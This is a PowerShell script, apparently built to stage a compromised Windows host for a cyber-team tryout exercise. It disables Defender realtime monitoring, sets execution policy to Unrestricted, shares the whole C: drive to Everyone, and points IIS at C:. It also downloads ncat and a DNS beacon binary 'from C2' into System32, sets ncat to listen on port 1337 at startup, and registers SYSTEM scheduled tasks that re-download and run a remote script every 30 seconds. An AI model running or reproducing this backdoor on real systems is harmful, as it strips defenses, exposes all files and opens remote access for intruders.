#Fix stupid Powershell execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
#Create unrestricted samba share on C:
New-SmbShare -Name "CShare" -Path "C:\" -FullAccess "Everyone"
#Kill Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true
#Download ncat binary from C2
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/ncat.exe" -OutFile "C:\Windows\System32\ncat.exe"
#Download dns binary from C2
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/dns_request.exe" -OutFile "C:\Windows\System32\dns_request.exe"
#Force ncat to run on startup and listen on port 1337
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "NcatStartup" -Value "C:\Windows\System32\ncat.exe -l -p 1337" -PropertyType "String"
#Download the bits service helper script
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bluefireexplosion/cyberdawgs-tryouts/master/bits-service.ps1" -OutFile "C:\Windows\System32\bits-service.ps1"
#Create a scheduled task running the BITS transfer every 30 seconds, redownloading from the internet
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-ExecutionPolicy Bypass -File C:\Windows\System32\bits-service.ps1'
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Seconds 30)
$Settings = New-ScheduledTaskSettingsSet
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger -Settings $Settings
Register-ScheduledTask -TaskName "BITS_Transfer_Task" -InputObject $Task
#Create a DNS task that performs the DNS request to the website every 10 seconds
Register-ScheduledTask -TaskName "DNS Fun" -Action (New-ScheduledTaskAction -Execute "C:\Windows\System32\dns_request.exe") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Seconds 10))
#Modify the default IIS site to point to C:\
Install-WindowsFeature -Name Web-Mgmt-Console, Web-Scripting-Tools
Set-WebConfiguration -Filter "/system.webServer/sites/site[@name='Default Web Site']/application[@path='/']/virtualDirectory[@path='/']" -Value @{physicalPath='C:\'}

